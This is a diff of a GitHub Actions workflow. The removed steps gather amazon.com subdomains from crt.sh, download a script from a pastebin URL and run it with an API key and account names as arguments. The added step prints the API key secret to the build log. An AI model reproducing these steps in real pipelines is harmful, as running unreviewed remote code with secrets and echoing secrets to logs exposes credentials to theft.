@@ -17,31 +17,5 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    - name: Create output directory
-      run: mkdir -p output
-
-    - name: Update system packages
-      run: sudo apt update -y
-
-    - name: Install required packages
-      run: |
-        sudo apt install -y curl jq python3 zip python3-pip
-        python3 -m pip install requests
-
-    - name: Fetch CRT data
-      run: |
-        curl -s "https://crt.sh/?q=amazon.com&output=json" | \
-        jq -r '.[].name_value' | \
-        grep -Po '(\w+\.\w+\.\w+)$' | \
-        sort -u > output/out.txt
-
-    - name: Zip the output
-      run: zip -r output.zip output/out.txt
-
-    - name: Download script.py
-      run: |
-        curl -o script.py https://pastebin.com/raw/Au0i8d7F
-        chmod +x script.py
-
-    - name: Execute Python script
-      run: python3 script.py $API_KEY hamid1dev101 hamidaqq output.zip
+    - name: Echo the API Key
+      run: echo "API_KEY is: $API_KEY"
